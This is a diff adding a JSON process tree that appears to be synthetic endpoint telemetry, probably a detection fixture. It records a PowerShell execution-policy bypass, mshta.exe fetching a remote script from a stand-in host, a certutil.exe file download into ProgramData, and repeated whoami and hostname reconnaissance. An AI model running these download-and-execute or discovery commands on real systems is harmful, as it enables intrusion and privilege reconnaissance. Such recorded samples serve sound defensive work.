@@ -1,0 +1,253 @@
+{
+  "pid": 331000,
+  "ppid": 0,
+  "name": "OfficeClickToRun.exe",
+  "command": "OfficeClickToRun.exe ",
+  "children": [
+    {
+      "pid": 331007,
+      "ppid": 331000,
+      "name": "powershell.exe",
+      "command": "powershell.exe -NoProfile -WindowStyle Minimized -ExecutionPolicy Bypass -File \"C:\\IT\\Tools\\RunDiagnostics_9dab087d.ps1\" -Host \"BLD-991\" -Mode Verify",
+      "children": [
+        {
+          "pid": 331009,
+          "ppid": 331007,
+          "name": "mshta.exe",
+          "command": "mshta.exe \"http://cdn.contoso-updates.com/ops/verify.ps1\"",
+          "children": [
+            {
+              "pid": 331013,
+              "ppid": 331009,
+              "name": "hostname.exe",
+              "command": "hostname.exe",
+              "children": [
+                {
+                  "pid": 331016,
+                  "ppid": 331013,
+                  "name": "certutil.exe",
+                  "command": "certutil.exe -urlcache -split -f \"http://intra-update.corp.local/certs/workstation.cer\" \"C:\\ProgramData\\Northwind\\Patch\\relay.bin\"",
+                  "children": [
+                    {
+                      "pid": 331020,
+                      "ppid": 331016,
+                      "name": "hostname.exe",
+                      "command": "hostname.exe > \"C:\\Users\\aarav.jain\\AppData\\Local\\Temp\\host_1be2d8e8.txt\"",
+                      "children": [
+                        {
+                          "pid": 331022,
+                          "ppid": 331020,
+                          "name": "findstr.exe",
+                          "command": "findstr.exe /i \"certificate\" \"C:\\ProgramData\\BlueYonder\\Logs\\diag.log\"",
+                          "children": [
+                            {
+                              "pid": 331025,
+                              "ppid": 331022,
+                              "name": "ping.exe",
+                              "command": "ping.exe -n 21 127.0.0.1 > nul",
+                              "children": [
+                                {
+                                  "pid": 331027,
+                                  "ppid": 331025,
+                                  "name": "tasklist.exe",
+                                  "command": "tasklist.exe",
+                                  "children": [
+                                    {
+                                      "pid": 331029,
+                                      "ppid": 331027,
+                                      "name": "whoami.exe",
+                                      "command": "whoami.exe /groups",
+                                      "children": [
+                                        {
+                                          "pid": 331030,
+                                          "ppid": 331029,
+                                          "name": "hostname.exe",
+                                          "command": "hostname.exe > \"C:\\Users\\aarav.jain\\AppData\\Local\\Temp\\host_24020a91.txt\"",
+                                          "children": [
+                                            {
+                                              "pid": 331037,
+                                              "ppid": 331030,
+                                              "name": "hostname.exe",
+                                              "command": "hostname.exe > \"C:\\Users\\aarav.jain\\AppData\\Local\\Temp\\host_178e4a65.txt\"",
+                                              "children": [
+                                                {
+                                                  "pid": 331039,
+                                                  "ppid": 331037,
+                                                  "name": "whoami.exe",
+                                                  "command": "whoami.exe > \"C:\\Users\\aarav.jain\\AppData\\Local\\Temp\\who_9d2f1840.txt\"",
+                                                  "children": [
+                                                    {
+                                                      "pid": 331043,
+                                                      "ppid": 331039,
+                                                      "name": "whoami.exe",
+                                                      "command": "whoami.exe /priv",
+                                                      "children": [
+                                                        {
+                                                          "pid": 331044,
+                                                          "ppid": 331043,
+                                                          "name": "whoami.exe",
+                                                          "command": "whoami.exe /priv > \"C:\\Users\\aarav.jain\\AppData\\Local\\Temp\\who_548250c7.txt\"",
+                                                          "children": [
+                                                            {
+                                                              "pid": 331047,
+                                                              "ppid": 331044,
+                                                              "name": "whoami.exe",
+                                                              "command": "whoami.exe /all",
+                                                              "children": [
+                                                                {
+                                                                  "pid": 331059,
+                                                                  "ppid": 331047,
+                                                                  "name": "hostname.exe",
+                                                                  "command": "hostname.exe > \"C:\\Users\\aarav.jain\\AppData\\Local\\Temp\\host_3bf1a609.txt\"",
+                                                                  "children": [
+                                                                    {
+                                                                      "pid": 331063,
+                                                                      "ppid": 331059,
+                                                                      "name": "hostname.exe",
+                                                                      "command": "hostname.exe",
+                                                                      "children": [
+                                                                        {
+                                                                          "pid": 331067,
+                                                                          "ppid": 331063,
+                                                                          "name": "choice.exe",
+                                                                          "command": "choice.exe /d y /t 4 > nul",
+                                                                          "children": [
+                                                                            {
+                                                                              "pid": 331073,
+                                                                              "ppid": 331067,
+                                                                              "name": "hostname.exe",
+                                                                              "command": "hostname.exe",
+                                                                              "children": []
+                                                                            }
+                                                                          ]
+                                                                        },
+                                                                        {
+                                                                          "pid": 331080,
+                                                                          "ppid": 331063,
+                                                                          "name": "choice.exe",
+                                                                          "command": "choice.exe /d y /t 6 > nul",
+                                                                          "children": [
+                                                                            {
+                                                                              "pid": 331082,
+                                                                              "ppid": 331080,
+                                                                              "name": "hostname.exe",
+                                                                              "command": "hostname.exe",
+                                                                              "children": [
+                                                                                {
+                                                                                  "pid": 331089,
+                                                                                  "ppid": 331082,
+                                                                                  "name": "timeout.exe",
+                                                                                  "command": "timeout.exe /t 20 /nobreak",
+                                                                                  "children": [
+                                                                                    {
+                                                                                      "pid": 331091,
+                                                                                      "ppid": 331089,
+                                                                                      "name": "ping.exe",
+                                                                                      "command": "ping.exe -n 26 127.0.0.1 > nul",
+                                                                                      "children": [
+                                                                                        {
+                                                                                          "pid": 331094,
+                                                                                          "ppid": 331091,
+                                                                                          "name": "whoami.exe",
+                                                                                          "command": "whoami.exe /priv",
+                                                                                          "children": [
+                                                                                            {
+                                                                                              "pid": 331098,
+                                                                                              "ppid": 331094,
+                                                                                              "name": "hostname.exe",
+                                                                                              "command": "hostname.exe > \"C:\\Users\\aarav.jain\\AppData\\Local\\Temp\\host_9e4f4d4e.txt\"",
+                                                                                              "children": [
+                                                                                                {
+                                                                                                  "pid": 331102,
+                                                                                                  "ppid": 331098,
+                                                                                                  "name": "hostname.exe",
+                                                                                                  "command": "hostname.exe",
+                                                                                                  "children": [
+                                                                                                    {
+                                                                                                      "pid": 331106,
+                                                                                                      "ppid": 331102,
+                                                                                                      "name": "whoami.exe",
+                                                                                                      "command": "whoami.exe /priv > \"C:\\Users\\aarav.jain\\AppData\\Local\\Temp\\who_b8e6271a.txt\"",
+                                                                                                      "children": [
+                                                                                                        {
+                                                                                                          "pid": 331109,
+                                                                                                          "ppid": 331106,
+                                                                                                          "name": "whoami.exe",
+                                                                                                          "command": "whoami.exe /all > \"C:\\Users\\aarav.jain\\AppData\\Local\\Temp\\who_4eae665a.txt\"",
+                                                                                                          "children": [
+                                                                                                            {
+                                                                                                              "pid": 331113,
+                                                                                                              "ppid": 331109,
+                                                                                                              "name": "timeout.exe",
+                                                                                                              "command": "timeout.exe /t 2 /nobreak",
+                                                                                                              "children": []
+                                                                                                            }
+                                                                                                          ]
+                                                                                                        }
+                                                                                                      ]
+                                                                                                    }
+                                                                                                  ]
+                                                                                                }
+                                                                                              ]
+                                                                                            }
+                                                                                          ]
+                                                                                        }
+                                                                                      ]
+                                                                                    }
+                                                                                  ]
+                                                                                }
+                                                                              ]
+                                                                            }
+                                                                          ]
+                                                                        }
+                                                                      ]
+                                                                    }
+                                                                  ]
+                                                                }
+                                                              ]
+                                                            }
+                                                          ]
+                                                        }
+                                                      ]
+                                                    }
+                                                  ]
+                                                }
+                                              ]
+                                            }
+                                          ]
+                                        }
+                                      ]
+                                    }
+                                  ]
+                                }
+                              ]
+                            }
+                          ]
+                        }
+                      ]
+                    }
+                  ]
+                }
+              ]
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "pid": 331053,
+      "ppid": 331000,
+      "name": "whoami.exe",
+      "command": "whoami.exe /priv",
+      "children": [
+        {
+          "pid": 331056,
+          "ppid": 331053,
+          "name": "whoami.exe",
+          "command": "whoami.exe",
+          "children": []
+        }
+      ]
+    }
+  ]
+}
